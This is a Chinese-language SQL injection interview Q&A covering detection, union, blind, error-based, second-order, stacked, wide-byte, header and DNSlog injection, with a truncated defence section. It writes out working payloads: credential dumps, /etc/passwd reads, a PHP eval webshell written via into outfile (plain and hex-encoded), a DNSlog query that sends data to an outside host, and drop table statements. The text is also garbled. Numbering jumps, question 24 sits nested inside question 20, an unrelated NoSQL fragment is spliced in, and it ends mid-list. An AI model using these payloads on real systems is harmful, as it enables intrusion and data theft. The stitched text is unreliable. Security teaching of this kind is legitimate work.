<h3 class="md-end-block md-heading"><span class="md-plain">1. 什么是 SQL 注入？</span></h3>
<p class="md-end-block md-p"><span class="md-plain">SQL 注入（SQL Injection）是一种常见的 Web 安全漏洞，指攻击者通过在用户输入中插入恶意 SQL 语句，使后端数据库将其当作合法 SQL 代码执行，从而实现非法访问、篡改或删除数据库数据，甚至控制服务器的攻击方式。其本质是</span><span class="md-pair-s "><strong><span class="md-plain">用户输入未被严格过滤 / 验证，直接拼接进入 SQL 查询语句</span></strong></span><span class="md-plain">。</span></p>

<h3 class="md-end-block md-heading"><span class="md-plain">2. SQL 注入的原理是什么？</span></h3>
<p class="md-end-block md-p"><span class="md-plain">原理核心：</span><span class="md-pair-s "><strong><span class="md-plain">用户可控输入被当作 SQL 代码的一部分执行</span></strong></span><span class="md-plain">。</span> <span class="md-plain">当应用程序将用户输入（如 URL 参数、表单数据、HTTP 头）直接拼接进 SQL 语句，且未做过滤或转义时，攻击者可构造恶意输入（如单引号、逻辑运算符）改变 SQL 语句的原有逻辑。</span> <span class="md-plain">例如：正常查询为</span><span class="md-pair-s" spellcheck="false"><code>select * from news where id=&#039;1&#039;</code></span><span class="md-plain">，若用户输入</span><span class="md-pair-s" spellcheck="false"><code>1&#039; or &#039;1&#039;=&#039;1</code></span><span class="md-plain">，拼接后语句变为</span><span class="md-pair-s" spellcheck="false"><code>select * from news where id=&#039;1&#039; or &#039;1&#039;=&#039;1&#039;</code></span><span class="md-plain">，导致查询返回所有数据。</span></p>

<h3 class="md-end-block md-heading"><span class="md-plain">3. 如何判断一个网站是否有 SQL 注入点？</span></h3>
<p class="md-end-block md-p"><span class="md-plain">可通过以下步骤初步判断（以</span><span class="md-pair-s" spellcheck="false"><code>http://test.com/news?id=1</code></span><span class="md-plain">为例）：</span></p>

<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">参数篡改测试</span></strong></span><span class="md-plain">：修改参数值，如</span><span class="md-pair-s" spellcheck="false"><code>id=1&#039;</code></span><span class="md-plain">（加单引号），观察是否返回 SQL 语法错误（如 “you have an error in your SQL syntax”）；</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">逻辑判断测试</span></strong></span><span class="md-plain">：对比</span><span class="md-pair-s" spellcheck="false"><code>id=1 and 1=1</code></span><span class="md-plain">（正常响应）和</span><span class="md-pair-s" spellcheck="false"><code>id=1 and 1=2</code></span><span class="md-plain">（无响应或异常），若结果不同，可能存在注入；</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p md-focus"><span class="md-pair-s "><strong><span class="md-plain">排序测试</span></strong></span><span class="md-plain">：用</span><span class="md-pair-s" spellcheck="false"><code>id=1 order by 1</code></span><span class="md-plain">（正常）、</span><span class="md-pair-s" spellcheck="false"><code>id=1 order by 10</code></span><span class="md-plain">（异常），通过响应变化判断查询列数，若列数异常时出错，可能存在注入；</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">联合查询测试</span></strong></span><span class="md-plain">：用</span><span class="md-pair-s" spellcheck="false"><code>id=1 union select 1,2,3</code></span><span class="md-plain">，若返回 “2”“3” 等数字，说明注入点可利用。</span></p>
</li>
</ul>
<h3 class="md-end-block md-heading"><span class="md-plain">4. SQL 注入的危害有哪些？（含利用方式）</span></h3>
<p class="md-end-block md-p"><span class="md-plain">SQL 注入危害极大，主要包括：</span></p>

<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">数据库信息泄露</span></strong></span><span class="md-plain">：通过注入获取数据库结构（表名、字段名）、敏感数据（账号密码、个人信息），例如</span><span class="md-pair-s" spellcheck="false"><code>union select username,password from users</code></span><span class="md-plain">；</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">数据篡改 / 删除</span></strong></span><span class="md-plain">：通过</span><span class="md-pair-s" spellcheck="false"><code>update</code></span><span class="md-plain">/</span><span class="md-pair-s" spellcheck="false"><code>delete</code></span><span class="md-plain">语句修改或删除数据，例如</span><span class="md-pair-s" spellcheck="false"><code>id=1; delete from users where id=2--</code></span><span class="md-plain">；</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">服务器权限获取</span></strong></span><span class="md-plain">：若数据库用户权限足够，可通过</span><span class="md-pair-s" spellcheck="false"><code>load_file()</code></span><span class="md-plain">读取服务器文件（如</span><span class="md-pair-s" spellcheck="false"><code>select load_file(&#039;/etc/passwd&#039;)</code></span><span class="md-plain">），或通过</span><span class="md-pair-s" spellcheck="false"><code>into outfile</code></span><span class="md-plain">写入 Webshell（如</span><span class="md-pair-s" spellcheck="false"><code>select &#039;&lt;?php eval($_POST[cmd]);?&gt;&#039; into outfile &#039;/var/www/shell.php&#039;</code></span><span class="md-plain">）；</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">拒绝服务</span></strong></span><span class="md-plain">：通过复杂查询或删除关键表（如</span><span class="md-pair-s" spellcheck="false"><code>drop table users</code></span><span class="md-plain">）导致服务不可用；</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">内网渗透</span></strong></span><span class="md-plain">：利用数据库权限进一步攻击内网（如通过数据库连接内网其他主机）。</span></p>
</li>
</ul>
<h3 class="md-end-block md-heading"><span class="md-plain">5. 宽字节注入原理是什么？（含产生原理、条件、解决办法）</span></h3>
<h4 class="md-end-block md-heading"><span class="md-plain">产生原理</span></h4>
<p class="md-end-block md-p"><span class="md-plain">宽字节注入是因数据库使用宽字节编码（如 GBK、GB2312）且输入被转义导致的漏洞。</span></p>

<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">宽字节编码（如 GBK）用 2 个字节表示一个字符，范围为</span><span class="md-pair-s" spellcheck="false"><code>0x81-0xFE</code></span><span class="md-plain">（高字节）+</span><span class="md-pair-s" spellcheck="false"><code>0x40-0xFE</code></span><span class="md-plain">（低字节）；</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">应用通常会对用户输入的特殊字符（如单引号</span><span class="md-pair-s" spellcheck="false"><code>&#039;</code></span><span class="md-plain">）转义，例如将</span><span class="md-pair-s" spellcheck="false"><code>&#039;</code></span><span class="md-plain">变为</span><span class="md-pair-s" spellcheck="false"><code>\&#039;</code></span><span class="md-plain">（</span><span class="md-pair-s" spellcheck="false"><code>\</code></span><span class="md-plain">的 ASCII 码为</span><span class="md-pair-s" spellcheck="false"><code>0x5c</code></span><span class="md-plain">）；</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">若攻击者输入一个高字节字符（如</span><span class="md-pair-s" spellcheck="false"><code>0xbf</code></span><span class="md-plain">），则</span><span class="md-pair-s" spellcheck="false"><code>0xbf</code></span><span class="md-plain">+</span><span class="md-pair-s" spellcheck="false"><code>0x5c</code></span><span class="md-plain">（转义符）会被 GBK 解析为一个合法字符 “縗”，导致转义失效，单引号</span><span class="md-pair-s" spellcheck="false"><code>&#039;</code></span><span class="md-plain">被保留，从而注入成功（如</span><span class="md-pair-s" spellcheck="false"><code>id=1%bf&#039; or 1=1--</code></span><span class="md-plain">）。</span></p>
</li>
</ul>
<h4 class="md-end-block md-heading"><span class="md-plain">条件</span></h4>
<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">数据库使用宽字节编码</span></strong></span><span class="md-plain">：如 GBK、GB2312（每个字符占 2 字节）；</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">输入被转义处理</span></strong></span><span class="md-plain">：特殊字符（如</span><span class="md-pair-s" spellcheck="false"><code>&#039;</code></span><span class="md-plain">）被转义为</span><span class="md-pair-s" spellcheck="false"><code>\&#039;</code></span><span class="md-plain">（</span><span class="md-pair-s" spellcheck="false"><code>\</code></span><span class="md-plain">的 ASCII 码为</span><span class="md-pair-s" spellcheck="false"><code>0x5c</code></span><span class="md-plain">）；</span></p>
</li>
</ul>
<h4 class="md-end-block md-heading"><span class="md-plain">解决办法</span></h4>
<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">使用 UTF-8 编码（非宽字节，避免宽字节解析问题）；</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">禁用数据库的宽字节自动转换（如 MySQL 的</span><span class="md-pair-s" spellcheck="false"><code>SET NAMES &#039;gbk&#039;</code></span><span class="md-plain">可能触发，需改为</span><span class="md-pair-s" spellcheck="false"><code>SET character_set_client=binary</code></span><span class="md-plain">）；</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">采用参数化查询（彻底避免拼接 SQL）。</span></p>
</li>
</ul>

<h3 class="md-end-block md-heading"><span class="md-plain">7. Dnslog 注入需要的条件是什么？</span></h3>
<p class="md-end-block md-p"><span class="md-plain">Dnslog 注入是盲注（无回显）场景下的一种带外数据获取方式，核心是通过 DNS 解析日志获取注入结果，条件如下：</span></p>

<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">目标服务器可访问外部网络</span></strong></span><span class="md-plain">：需能向攻击者控制的 DNS 服务器发起解析请求；</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">注入点支持执行带外查询</span></strong></span><span class="md-plain">：例如能执行</span><span class="md-pair-s" spellcheck="false"><code>load_file()</code></span><span class="md-plain">（读取远程文件触发 DNS 解析）或</span><span class="md-pair-s" spellcheck="false"><code>select ... into outfile</code></span><span class="md-plain">（写入远程路径）；</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">攻击者拥有可控 DNS 服务器</span></strong></span><span class="md-plain">：需能记录 DNS 解析日志（如使用</span><span class="md-pair-s" spellcheck="false"><code>Dnslog.cn</code></span><span class="md-plain">等平台）。</span></p>
</li>
</ul>
<p class="md-end-block md-p"><span class="md-plain">举例：</span><span class="md-pair-s" spellcheck="false"><code>id=1&#039; and (select load_file(concat(&#039;\\\\&#039;,(select database()),&#039;.xxx.Dnslog.cn\\a&#039;)))--</code></span><span class="md-plain">，其中</span><span class="md-pair-s" spellcheck="false"><code>(select database())</code></span><span class="md-plain">的结果会作为子域名被解析，攻击者通过 DNS 日志获取数据库名。</span></p>

<h3 class="md-end-block md-heading"><span class="md-plain">8. SQL 写入 webshell 的方法是什么？</span></h3>
<p class="md-end-block md-p"><span class="md-plain">写入 Webshell 的核心是通过 SQL 语句将恶意代码写入网站可访问的路径，步骤如下：</span></p>

<ol class="ol-list" start="">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">确认条件</span></strong></span><span class="md-plain">：</span></p>

<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">数据库用户有</span><span class="md-pair-s" spellcheck="false"><code>FILE</code></span><span class="md-plain">权限（</span><span class="md-pair-s" spellcheck="false"><code>select file_priv from mysql.user where user=current_user()</code></span><span class="md-plain">返回</span><span class="md-pair-s" spellcheck="false"><code>Y</code></span><span class="md-plain">）；</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">已知网站绝对路径（如通过错误信息、配置文件或爆破获取）；</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">secure_file_priv 未限制：</span></p>

<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s" spellcheck="false"><code>secure_file_priv</code></span><span class="md-plain"> 为 </span><span class="md-pair-s" spellcheck="false"><code>NULL</code></span><span class="md-plain">：不允许导入导出；</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s" spellcheck="false"><code>secure_file_priv</code></span><span class="md-plain"> 为指定文件夹：仅允许在该文件夹操作；</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s" spellcheck="false"><code>secure_file_priv</code></span><span class="md-plain"> 为空：允许任意路径读写（漏洞利用的必要条件）。</span></p>
</li>
</ul>
</li>
</ul>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">写入语句</span></strong></span><span class="md-plain">：</span> <span class="md-plain">以 MySQL 为例，使用</span><span class="md-pair-s" spellcheck="false"><code>into outfile</code></span><span class="md-plain">：</span></p>



```sql
-- 直接写入PHP一句话  
select '<?php @eval($_POST["cmd"]);?>' into outfile '/var/www/html/shell.php'  
​
-- 若特殊字符被过滤，用十六进制编码  
select 0x3c3f70687020406576616c28245f504f53545b22636d64225d293b3f3e into outfile '/var/www/html/shell.php'
```


</li>
</ol>
<h3 class="md-end-block md-heading"><span class="md-plain">9. SQL 注入常见的类型有哪些？</span></h3>
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">按利用手法</span></strong></span><span class="md-plain">：</span></p>

<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">联合注入（</span><span class="md-pair-s" spellcheck="false"><code>union select</code></span><span class="md-plain">）：通过</span><span class="md-pair-s" spellcheck="false"><code>union</code></span><span class="md-plain">拼接查询，直接获取数据；</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">盲注（布尔盲注 / 时间盲注）：无回显时，通过逻辑判断（</span><span class="md-pair-s" spellcheck="false"><code>and 1=1</code></span><span class="md-plain">）或延时（</span><span class="md-pair-s" spellcheck="false"><code>and sleep(5)</code></span><span class="md-plain">）猜解数据；</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">报错注入：构造语句触发数据库错误，从错误信息中提取数据（如</span><span class="md-pair-s" spellcheck="false"><code>extractvalue(1,concat(0x7e,(select database()),0x7e))</code></span><span class="md-plain">）；</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">堆叠注入：用分号分隔多条 SQL 语句（如</span><span class="md-pair-s" spellcheck="false"><code>id=1; drop table users--</code></span><span class="md-plain">）；</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">二次注入：输入先被存储（如注册时输入</span><span class="md-pair-s" spellcheck="false"><code>admin&#039;#</code></span><span class="md-plain">），后续被读取时触发注入（如登录时拼接为</span><span class="md-pair-s" spellcheck="false"><code>select * from users where username=&#039;admin&#039;#&#039;</code></span><span class="md-plain">）；</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">宽字节注入：利用宽字节编码绕过转义（如 GBK 编码下</span><span class="md-pair-s" spellcheck="false"><code>%bf&#039;</code></span><span class="md-plain">被解析为合法字符，单引号生效）。</span></p>
</li>
</ul>
<h3 class="md-end-block md-heading"><span class="md-plain">10. 什么是盲注（Blind SQL Injection）？</span></h3>
<p class="md-end-block md-p"><span class="md-plain">盲注是指注入点无明确错误回显（如只返回 “成功 / 失败” 或固定页面），需通过间接判断获取数据的注入方式，分为两种：</span></p>

<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">布尔盲注</span></strong></span><span class="md-plain">：通过逻辑表达式的真假判断结果，步骤：</span></p>

<ol class="ol-list" start="">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">猜解长度：</span><span class="md-pair-s" spellcheck="false"><code>id=1&#039; and length(database())&gt;5--</code></span><span class="md-plain">（若响应正常，说明长度 > 5）；</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">逐字符猜解：</span><span class="md-pair-s" spellcheck="false"><code>id=1&#039; and substr(database(),1,1)=&#039;a&#039;--</code></span><span class="md-plain">（通过响应是否正常判断首字符是否为</span><span class="md-pair-s" spellcheck="false"><code>a</code></span><span class="md-plain">）。</span></p>
</li>
</ol>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">时间盲注</span></strong></span><span class="md-plain">：通过延时函数（如</span><span class="md-pair-s" spellcheck="false"><code>sleep()</code></span><span class="md-plain">）的执行结果判断，步骤：</span></p>

<ol class="ol-list" start="">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">触发延时：</span><span class="md-pair-s" spellcheck="false"><code>id=1&#039; and if(substr(database(),1,1)=&#039;a&#039;,sleep(5),0)--</code></span><span class="md-plain">；</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">观察响应时间：若延迟 5 秒，说明首字符为</span><span class="md-pair-s" spellcheck="false"><code>a</code></span><span class="md-plain">。</span></p>
</li>
</ol>
</li>
</ul>
<p class="md-end-block md-p"><span class="md-plain">提高效率的方法：用ASCII码二分法（如判断字符是否在</span><span class="md-pair-s" spellcheck="false"><code>a-m</code></span><span class="md-plain">或</span><span class="md-pair-s" spellcheck="false"><code>n-z</code></span><span class="md-plain">）、编写脚本自动化猜解。</span></p>

<h3 class="md-end-block md-heading"><span class="md-plain">11. UNION 联合注入是什么？</span></h3>
<p class="md-end-block md-p"><span class="md-plain">UNION 注入利用</span><span class="md-pair-s" spellcheck="false"><code>UNION</code></span><span class="md-plain">操作符（合并两个查询结果）获取数据库信息，条件是</span><span class="md-pair-s "><strong><span class="md-plain">前后两个查询的列数相同、数据类型兼容</span></strong></span><span class="md-plain">。</span></p>
<p class="md-end-block md-p"><span class="md-plain">步骤：</span></p>

<ol class="ol-list" start="">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">判断列数</span></strong></span><span class="md-plain">：</span><span class="md-pair-s" spellcheck="false"><code>id=1 order by 3--</code></span><span class="md-plain">（正常）、</span><span class="md-pair-s" spellcheck="false"><code>id=1 order by 4--</code></span><span class="md-plain">（异常），确定列数为 3；</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">找到显位</span></strong></span><span class="md-plain">：</span><span class="md-pair-s" spellcheck="false"><code>id=1&#039; union select 1,2,3--</code></span><span class="md-plain">，若页面显示 “2”“3”，说明第 2、3 列是显位；</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">获取信息</span></strong></span><span class="md-plain">：在显位中插入查询语句，如</span><span class="md-pair-s" spellcheck="false"><code>id=1&#039; union select 1,database(),version()--</code></span><span class="md-plain">，获取数据库名和版本。</span></p>
</li>
</ol>
<h3 class="md-end-block md-heading"><span class="md-plain">12. 报错注入（Error-based）的原理是什么？</span></h3>
<p class="md-end-block md-p"><span class="md-plain">报错注入是通过构造特殊 SQL 语句，使数据库返回包含敏感信息的错误提示，原理是</span><span class="md-pair-s "><strong><span class="md-plain">利用数据库报错机制将查询结果嵌入错误信息</span></strong></span><span class="md-plain">。</span></p>

<h3 class="md-end-block md-heading"><span class="md-plain">13. 二次注入（Second-order）是什么？</span></h3>
<p class="md-end-block md-p"><span class="md-plain">二次注入是指恶意输入先被 “安全存储”，后续被读取时未重新过滤，导致注入执行的攻击方式，流程如下：</span></p>

<ol class="ol-list" start="">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">注入存储阶段</span></strong></span><span class="md-plain">：攻击者输入恶意内容（如注册用户名</span><span class="md-pair-s" spellcheck="false"><code>admin&#039;#</code></span><span class="md-plain">），应用对输入进行转义（如</span><span class="md-pair-s" spellcheck="false"><code>admin\&#039;#</code></span><span class="md-plain">）后存入数据库；</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">注入触发阶段</span></strong></span><span class="md-plain">：后续操作读取该数据（如查询用户信息），应用直接拼接 SQL（</span><span class="md-pair-s" spellcheck="false"><code>select * from users where username=&#039;admin\&#039;#</code></span><span class="md-plain">），但存储的转义符可能被忽略（如数据库存储时自动去除</span><span class="md-pair-s" spellcheck="false"><code>\</code></span><span class="md-plain">），导致语句变为</span><span class="md-pair-s" spellcheck="false"><code>select * from users where username=&#039;admin&#039;#</code></span><span class="md-plain">，注释掉后续内容，实现注入。</span></p>
</li>
</ol>
<h3 class="md-end-block md-heading"><span class="md-plain">14. 堆叠注入的原理是什么？</span></h3>
<p class="md-end-block md-p"><span class="md-plain">堆叠注入（Stacked Injections）利用 SQL 语句支持批量执行的特性，通过分号</span><span class="md-pair-s" spellcheck="false"><code>;</code></span><span class="md-plain">分隔多条语句，使后端一次性执行，原理：</span></p>

<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">多数数据库（如 MySQL、SQL Server）支持用</span><span class="md-pair-s" spellcheck="false"><code>;</code></span><span class="md-plain">分隔多条 SQL 语句（如</span><span class="md-pair-s" spellcheck="false"><code>select * from users; delete from logs;</code></span><span class="md-plain">）；</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">若应用未限制语句数量，攻击者可在注入点后拼接额外语句（如查询 + 删除 + 写入）。</span></p>
</li>
</ul>
<p class="md-end-block md-p"><span class="md-plain">举例：</span><span class="md-pair-s" spellcheck="false"><code>id=1&#039;; drop table users;--</code></span><span class="md-plain">，执行后会先查询</span><span class="md-pair-s" spellcheck="false"><code>id=1</code></span><span class="md-plain">，再删除</span><span class="md-pair-s" spellcheck="false"><code>users</code></span><span class="md-plain">表。</span></p>
<p class="md-end-block md-p"><span class="md-plain">限制：部分数据库（如 Oracle）或应用框架（如 PDO）默认禁止堆叠执行，仅支持单条语句。</span></p>

<h3 class="md-end-block md-heading"><span class="md-plain">15. 如何提高手工盲注的效率？</span></h3>
<p class="md-end-block md-p"><span class="md-plain">手工盲注效率较低，可通过以下方法优化：</span></p>

<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">Dnslog快速查询</span></strong></span><span class="md-plain">：需要执行 mysql 的 load_file 函数和 UNC 路径，但是 UNC 路径只能在位于 Windows 上运行；</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">二分法猜解</span></strong></span><span class="md-plain">：例如猜解字符时，先判断是否大于</span><span class="md-pair-s" spellcheck="false"><code>m</code></span><span class="md-plain">（中间值），缩小范围（如</span><span class="md-pair-s" spellcheck="false"><code>substr(xxx,1,1)&gt;&#039;m&#039;</code></span><span class="md-plain">）；</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">二进制延迟注入</span></strong></span><span class="md-plain">：通过二进制位运算逐位判断数据（如字符的 ASCII 码）；</span></p>
</li>
</ul>

<h3 class="md-end-block md-heading"><span class="md-plain">19. MySQL 一个 @ 和两个 @ 什么区别？</span></h3>
<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">单 @</span></strong></span><span class="md-plain">：表示</span><span class="md-pair-s "><strong><span class="md-plain">用户变量</span></strong></span><span class="md-plain">（自定义变量），作用域为当前会话，需手动赋值：</span></p>



```sql
set @var = 1;  -- 赋值  
select @var;   -- 输出1
```


</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">双 @@</span></strong></span><span class="md-plain">：表示</span><span class="md-pair-s "><strong><span class="md-plain">系统变量</span></strong></span><span class="md-plain">（数据库预定义变量），存储数据库配置信息（如版本、路径）：</span></p>



```sql
select @@version;  -- 输出MySQL版本（如8.0.30）  
select @@datadir;  -- 输出数据存储路径（如/var/lib/mysql/）
```


</li>
</ul>
<h3 class="md-end-block md-heading"><span class="md-plain">20. SQL 注入过滤了逗号，怎么处理？</span></h3>
<p class="md-end-block md-p"><span class="md-plain">逗号（</span><span class="md-pair-s" spellcheck="false"><code>，</code></span><span class="md-plain">）常用于分隔参数（如</span><span class="md-pair-s" spellcheck="false"><code>substr(a,1,1)</code></span><span class="md-plain">、</span><span class="md-pair-s" spellcheck="false"><code>limit 1,2</code></span><span class="md-plain">），过滤后可通过以下方式替代：</span></p>

<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">

<h3 class="md-end-block md-heading"><span class="md-plain">24. SQL 头注入点是什么？</span></h3>
<p class="md-end-block md-p"><span class="md-plain">SQL 头注入是指注入点位于 HTTP 请求头中（非 URL / 表单参数），攻击者通过修改 HTTP 头字段注入恶意 SQL 代码，常见头字段：</span></p>

<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s" spellcheck="false"><code>User-Agent</code></span><span class="md-plain">：浏览器标识；</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s" spellcheck="false"><code>Referer</code></span><span class="md-plain">：请求来源页；</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s" spellcheck="false"><code>Cookie</code></span><span class="md-plain">：用户身份标识；</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s" spellcheck="false"><code>X-Forwarded-For</code></span><span class="md-plain">：客户端 IP。</span></p>
</li>
</ul>
<p class="md-end-block md-p"><span class="md-plain">举例：若应用将</span><span class="md-pair-s" spellcheck="false"><code>User-Agent</code></span><span class="md-plain">存入数据库时未过滤，修改</span><span class="md-pair-s" spellcheck="false"><code>User-Agent: &#039; or 1=1--</code></span><span class="md-plain">，可能导致查询变为</span><span class="md-pair-s" spellcheck="false"><code>insert into logs values(&#039;&#039; or 1=1--&#039;, ...)</code></span><span class="md-plain">，触发注入。</span></p>

</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">列族型</span></strong></span><span class="md-plain">：HBase（适合海量数据存储，如日志）；</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">图数据库</span></strong></span><span class="md-plain">：Neo4j（存储节点和关系，如社交网络关系）。</span></p>
</li>
</ul>
<p class="md-end-block md-p"><span class="md-plain">NoSQL 注入与 SQL 注入不同，通常利用查询语法漏洞（如 MongoDB 的</span><span class="md-pair-s" spellcheck="false"><code>$where</code></span><span class="md-plain">注入：</span><span class="md-pair-s" spellcheck="false"><code>username[$ne]=1</code></span><span class="md-plain">绕过登录）。</span></p>

<h3 class="md-end-block md-heading"><span class="md-plain">33. 如何用浏览器快速判断是否存在 SQL 注入（目标 URL 为 </span><span class="md-link md-pair-s" spellcheck="false"><a href="http://test.com/news?id=1">http://test.com/news?id=1</a></span><span class="md-plain">）？</span></h3>
<p class="md-end-block md-p"><span class="md-plain">通过浏览器修改参数观察响应，步骤：</span></p>

<ol class="ol-list" start="">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">单引号测试</span></strong></span><span class="md-plain">：在 URL 后加</span><span class="md-pair-s" spellcheck="false"><code>&#039;</code></span><span class="md-plain">，即</span><span class="md-pair-s" spellcheck="false"><code>http://test.com/news?id=1&#039;</code></span><span class="md-plain">，回车后观察：</span></p>

<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">若页面显示 SQL 语法错误（如 “you have an error in your SQL syntax”），可能存在注入；</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">若页面空白或报错 “500 Internal Server Error”，可能存在注入。</span></p>
</li>
</ul>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">逻辑判断测试</span></strong></span><span class="md-plain">：</span></p>

<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">访问</span><span class="md-pair-s" spellcheck="false"><code>id=1 and 1=1</code></span><span class="md-plain">（正常响应，与原页面一致）；</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">访问</span><span class="md-pair-s" spellcheck="false"><code>id=1 and 1=2</code></span><span class="md-plain">（响应异常，如空白、内容变化），若两者差异明显，可能存在注入。</span></p>
</li>
</ul>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">联合查询测试</span></strong></span><span class="md-plain">：访问</span><span class="md-pair-s" spellcheck="false"><code>id=1 union select 1,2,3</code></span><span class="md-plain">，若页面显示 “2”“3”，说明注入点可利用。</span></p>
</li>
</ol>
<h3 class="md-end-block md-heading"><span class="md-plain">34. SQL 注入的防御措施有哪些？</span></h3>
<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">参数化查询</span></strong></span><span class="md-plain">：使用预编译语句（如 PHP 的 PDO：</span><span class="md-pair-s" spellcheck="false"><code>$stmt = $pdo-&gt;prepare(&quot;select * from users where id=?&quot;)</code></span><span class="md-plain">），彻底避免拼接 SQL；</span></p>
</li>
 	<li class="md-list-item">
